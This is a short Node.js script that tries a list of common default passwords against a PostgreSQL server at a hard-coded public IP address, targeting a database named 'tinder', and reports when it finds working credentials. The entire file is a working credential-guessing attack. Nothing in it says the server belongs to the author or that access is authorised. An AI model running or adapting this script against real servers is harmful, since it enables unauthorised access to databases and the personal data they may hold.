const { Pool } = require('pg');

async function testConnection(password) {
  const pool = new Pool({
    connectionString: `postgres://postgres:${password}@64.23.168.72:5432/tinder`,
    connectionTimeoutMillis: 5000
  });

  try {
    const res = await pool.query("SELECT 1 as connected;");
    console.log(`SUCCESS with password: ${password}`);
    return true;
  } catch (err) {
    console.log(`FAIL with password ${password}:`, err.message);
    return false;
  } finally {
    await pool.end();
  }
}

async function run() {
  const passwords = ['987654321', 'postgres', '', 'admin', 'root'];
  for (const p of passwords) {
    const success = await testConnection(p);
    if (success) {
      console.log("Found working credentials!");
      process.exit(0);
    }
  }
  console.log("None of the common passwords worked. The port 5432 might also be closed to remote connections.");
}

run();
